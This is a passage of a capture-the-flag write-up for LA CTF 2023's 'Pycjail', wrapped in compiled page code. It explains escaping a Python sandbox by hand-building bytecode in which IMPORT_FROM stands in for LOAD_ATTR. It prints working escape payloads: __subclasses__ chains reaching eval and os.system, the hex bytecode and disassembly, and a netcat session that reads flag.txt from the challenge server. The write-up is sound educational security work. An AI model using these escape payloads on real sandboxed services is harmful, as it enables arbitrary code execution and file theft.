\",(0,e.jsx)(n.code,{children:\"INPLACE_*\"}),\", \",(0,e.jsx)(n.code,{children:\"POP_*\"}),\", \",(0,e.jsx)(n.code,{children:\"ROT_*\"}),\", and \",(0,e.jsx)(n.code,{children:\"DUP_*\"}),\". \",(0,e.jsx)(n.code,{children:\"CALL_*\"}),\" were going to be useful later on, but wouldn\\u2019t help us get a callable onto the stack. After spending about an hour with a teammate looking through the opcodes, we felt like there wasn\\u2019t anything there. So we did what anyone would do and asked ChatGPT (no, it wasn\\u2019t helpful).\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"https://raw.githubusercontent.com/Legoclones/website/main/source/static/lactf-pycjail/chatgpt.png\",alt:\"ChatGPT For the Rescue?\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"turning-point\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#turning-point\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Turning Point\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Desperate, we did some more research online with CTF writeups until I came across \",(0,e.jsx)(n.a,{href:\"https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak\",children:\"a write-up by kmh from DiceCTF 2021\"}),\". The challenge \",(0,e.jsx)(n.code,{children:\"TI-1337 Plus CE\"}),' was also a pyjail, and one of the things I learned was that \"',(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" is \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),' in disguise!\".']}),`\n`,(0,e.jsxs)(n.p,{children:[\"The opcode \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" was \",(0,e.jsx)(n.strong,{children:\"not banned\"}),\", but we hadn\\u2019t paid much attention to it because it always follows (and only functions properly with) the opcode \",(0,e.jsx)(n.code,{children:\"IMPORT_NAME\"}),\", which was banned. However, if we could use it to function as \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\", then that means we could get a callable onto the stack, and through attribute stacking run some code like \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()[144]()._module.__builtins__[\"eval\"](\"insert code here\")'}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"It was also apparent that since using \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" in place of \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" isn\\u2019t any default behavior for the Python interpreter, we would have to manually create custom bytecode to be successful. This actually made sense; normally, pyjails just ask for a line of code (single \",(0,e.jsx)(n.code,{children:\"input()\"}),\" call), but this one had you specify certain parts of the \",(0,e.jsx)(n.code,{children:\"code\"}),\" object you wanted to create. However, understanding the Python bytecode wouldn\\u2019t be \",(0,e.jsx)(n.em,{children:\"typical\"}),\" or even perhaps \",(0,e.jsx)(n.strong,{children:\"technically compliant\"}),\" explained the challenge author\\u2019s design choice.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Manual testing confirmed our suspicion that \",(0,e.jsx)(n.code,{children:\"IMPORT_FROM\"}),\" worked as desired, so it was now time to create a payload.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"developing-a-payload-with-restrictions\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#developing-a-payload-with-restrictions\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Developing a Payload With Restrictions\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"A lot of testing and trial \u0026 error was performed at this point to get a payload that would work. Getting the payload \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__'}),\" to work was fairly simple, however we ran into errors doing \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()'}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ python3 main.py\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts: \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d025300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"built-in method __subclasses__ of \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"type\"}),\" object at 0x55bf92bc364\",(0,e.jsxs)(n.span,{className:\"token operator\",children:[(0,e.jsx)(n.span,{className:\"token file-descriptor important\",children:\"0\"}),\"\u003e\"]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`$ python3 main.py\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts: \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02a1005300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Traceback \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"most recent call last\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  File \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/home/justin/tmp/lactf/main.py\"'}),\", line \",(0,e.jsx)(n.span,{className:\"token number\",children:\"51\"}),\", \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"module\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"))\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  File \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/home/justin/tmp/lactf/main.py\"'}),\", line -1, \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` f\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TypeError: object\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` takes no arguments\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"The opcode used above was \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\", so I tried \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\" and it works! Apparently the two ways for calling functions is by pairing \",(0,e.jsx)(n.code,{children:\"LOAD_METHOD\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\", or \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The next issue we ran into was getting a number on the stack. Because \",(0,e.jsx)(n.code,{children:\"main.py\"}),\" used the \",(0,e.jsx)(n.code,{children:\"input()\"}),\" function to get the data, everything was treated as a string. Inserting \",(0,e.jsx)(n.code,{children:\"1\"}),\" as a const would always have it render as \",(0,e.jsx)(n.code,{children:\"'1'\"}),\". After some research, we settled on the \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" opcode, which just ran the \",(0,e.jsx)(n.code,{children:\"len()\"}),\" function on the item on top of the stack. Since our first constant was just an empty string, and the actual value of the string didn\\u2019t matter (aka \",(0,e.jsx)(n.code,{children:'\"\".__class__'}),\" and \",(0,e.jsx)(n.code,{children:'\"abcd\".__class__'}),\" are the same), we could load that const onto the stack again and run \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" to put the length of that string onto the stack. We could just set the length of the initial string to whatever we want to obtain the desired integer.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"However, a second hiccup was encountered that required 2 additional opcodes to bypass. \",(0,e.jsx)(n.code,{children:\"GET_LEN\"}),\" pushed the integer we wanted onto the stack, but kept the loaded string on there too, which we didn\\u2019t want. I had to insert an extra \",(0,e.jsx)(n.code,{children:\"ROT_TWO\"}),\" and \",(0,e.jsx)(n.code,{children:\"POP_TOP\"}),\" opcode to switch the order and remove the string from the opcode.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"At this point, the payload we had was:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`Python code: 'aaaa...aaa'.__class__.__base__.__subclasses__()[14]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaa...aaa\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019005300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Disassembly:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -\u003e LOAD_CONST, consts[0] -\u003e 'aaaa...aaa'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d00 -\u003e IMPORT_FROM, names[0] -\u003e __class__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d01 -\u003e IMPORT_FROM, names[1] -\u003e __base__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d02 -\u003e IMPORT_FROM, names[2] -\u003e __subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8300 -\u003e CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -\u003e LOAD_CONST, consts[0] -\u003e 'aaaa...aaa'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1e00 -\u003e GET_LEN -\u003e 14 or whatever we want\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0200 -\u003e ROT_TWO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0100 -\u003e POP_TOP\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1900 -\u003e BINARY_SUBSCR\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`5300 -\u003e RETURN_VALUE\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We had \",(0,e.jsx)(n.strong,{children:\"2 consts, 1 name, and 4 opcodes\"}),\" left to get what we wanted, but we had access to \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/classes.txt\",children:\"an extensive list of classes\"}),\" that opened up functionality a lot.\"]}),`\n`,(0,e.jsxs)(n.p,{children:['The \"stereotypical\" payload ',(0,e.jsx)(n.a,{href:\"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins\",children:\"from HackTricks\"}),\" is to use \",(0,e.jsx)(n.code,{children:\"''.__class__.__bases__.__subclasses__()[144]()._module.__builtins__['__import__']('os').system('ls')\"}),\" to run system commands (note that this was slightly modified from the Python2 version, and the exact index of \",(0,e.jsx)(n.code,{children:\"\u003cclass 'warnings.catch_warnings'\u003e\"}),\" may vary depending on your installation \u0026 version). The problem with this payload was it required another 3 names (\",(0,e.jsx)(n.code,{children:\"_module\"}),\", \",(0,e.jsx)(n.code,{children:\"__builtins__\"}),\", \",(0,e.jsx)(n.code,{children:\"system\"}),\") and 3 consts (\",(0,e.jsx)(n.code,{children:\"'__import__'\"}),\", \",(0,e.jsx)(n.code,{children:\"'os'\"}),\", \",(0,e.jsx)(n.code,{children:\"'ls'\"}),\"), which we didn\\u2019t have. We considered making our first const of length 144 the same as our last const (padding our bash payload with extra \",(0,e.jsx)(n.code,{children:\";\"}),\"s until we reached our desired length), but we still had 2 extra names.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Our second thought was \",(0,e.jsx)(n.code,{children:'\"\".__class__.__base__.__subclasses__()[144]()._module.__builtins__[\"eval\"](\"insert code here\")'}),\", but that required 2 names and 2 consts (still 1 too many names).\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"After perusing the list of available classes one by one, I started looking into the class at index 118, which was \",(0,e.jsx)(n.code,{children:\"\u003cclass '_frozen_importlib_external.FileLoader'\u003e\"}),\". Looking at this class\\u2019s attributes, I saw the function \",(0,e.jsx)(n.code,{children:\"get_data()\"}),\", which required two arguments for the path of a file. Excited, I wrote up and tested the code \",(0,e.jsx)(n.code,{children:`(\"a\"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`}),\", and my local flag was printed! This only required 1 extra name and const (we even had one const leftover), and used exactly 4 more opcodes.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"final-payload\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#final-payload\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Final Payload\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The final payload was:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`''.__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__,get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019006d036401640183025300\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -\u003e LOAD_CONST, consts[0] -\u003e 'a'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d00 -\u003e IMPORT_FROM, names[0] -\u003e __class__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d01 -\u003e IMPORT_FROM, names[1] -\u003e __base__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d02 -\u003e IMPORT_FROM, names[2] -\u003e __subclasses__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8300 -\u003e CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6400 -\u003e LOAD_CONST, consts[0] -\u003e 'a'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1e00 -\u003e GET_LEN -\u003e 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0200 -\u003e ROT_TWO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0100 -\u003e POP_TOP\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`1900 -\u003e BINARY_SUBSCR\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6d03 -\u003e IMPORT_FROM, names[3] -\u003e get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6401 -\u003e LOAD_CONST, consts[1] -\u003e 'flag.txt'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`6401 -\u003e LOAD_CONST, consts[1] -\u003e 'flag.txt'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`8302 -\u003e CALL_FUNCTION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`5300 -\u003e RETURN_VALUE\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And server interaction:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"~/tmp/lactf $ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" lac.tf \",(0,e.jsx)(n.span,{className:\"token number\",children:\"31130\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`names: __class__,__base__,__subclasses__,get_data\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`code: 64006d006d016d02830064001e000200010019006d036401640183025300\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"here goes\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"b\",(0,e.jsx)(n.span,{className:\"token string\",children:\"'flag{maybe i should_only_allow_nops_next_time}\\\\n'\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"Flag:\"}),\" \",(0,e.jsx)(n.code,{children:\"flag{maybe_i_should_only_allow_nops_next_time}\"})]})]})}}var y=b;return w;})();\n;return Component;","toc":[{"value":"Pycjail (Misc, 495 Points)","url":"#pycjail-misc-495-points","depth":2},{"value":"Approaching the Problem","url":"#approaching-the-problem","depth":3},{"value":"Turning Point","url":"#turning-point","depth":3},{"value":"Developing a Payload With Restrictions","url":"#developing-a-payload-with-restrictions","depth":3},{"value":"Final Payload","url":"#final-payload","depth":3}],"frontMatter":{"readingTime":{"text":"11 min read","minutes":10.035,"time":602100,"words":2007},"slug":"lactf-2023/pycjail","fileName":"lactf-2023/pycjail.md","title":"LA CTF 2023 – Pycjail","date":"2023-02-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["LACTF 2023","Misc","Python","Pyjail","Sandbox","Opcode"],"summary":"Use bytecode manipulation to subvert jail restrictions.","canonical":"https://justinapplegate.me/2023/lactf-pycjail"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.26,"time":15600,"words":52},"slug":["legoclones"],"fileName":"legoclones.md","name":"Legoclones","avatar":"https://www.gravatar.com/avatar/a6122f35bdc157fb5e76ef5f3de833a2?d=identicon\u0026s=256","specialties":["Reverse","Web"],"twitter":"https://twitter.com/legoclones","github":"https://github.com/Legoclones","web":"https://justinapplegate.me","member":true,"description":"Just a simple man trying to make my way in the universe","order":16,"date":null}],"prev":{"title":"LA CTF 2023 – Snek","date":"2023-02-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["LACTF 2023","Reverse","Python","Pickle"],"summary":"Reverse engineer pickle and code objects to determine winning moves.","canonical":"https://justinapplegate.me/2023/lactf-snek","slug":"lactf-2023/snek"},"next":{"title":"UT CTF 2023 – Zipper","date":"2023-03-12T00:00:00.000Z","draft":false,"authors":["legoclones"],"tags":["UTCTF 2023","Misc","Zip"],"summary":"Craft a malicious Zip file with identically-named files to bypass a filter and get RCE.","canonical":"https://justinapplegate.me/2023/utctf-zipper/","slug":"utctf-2023/zipper"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["lactf-2023","pycjail"]},"buildId":"qjVMIloeGVfOBGlHlZkTe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>